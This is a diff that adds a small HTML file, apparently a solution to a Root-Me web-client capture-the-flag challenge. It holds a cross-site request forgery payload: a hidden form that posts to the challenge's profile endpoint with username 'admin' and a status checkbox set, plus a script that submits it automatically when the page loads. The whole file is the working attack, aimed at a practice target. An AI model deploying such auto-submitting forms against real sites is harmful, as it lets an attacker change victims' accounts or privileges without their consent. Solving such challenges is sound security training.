@@ -1,0 +1,6 @@
+<form id="asd" action="http://challeng01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">                    
+    <input type="text" name="username" value="admin">
+    <input type="checkbox" value="on" name="status" checked>
+    <button type="submit">Submit</button>
+</form>
+<script>document.getElementById("asd").submit()</script>
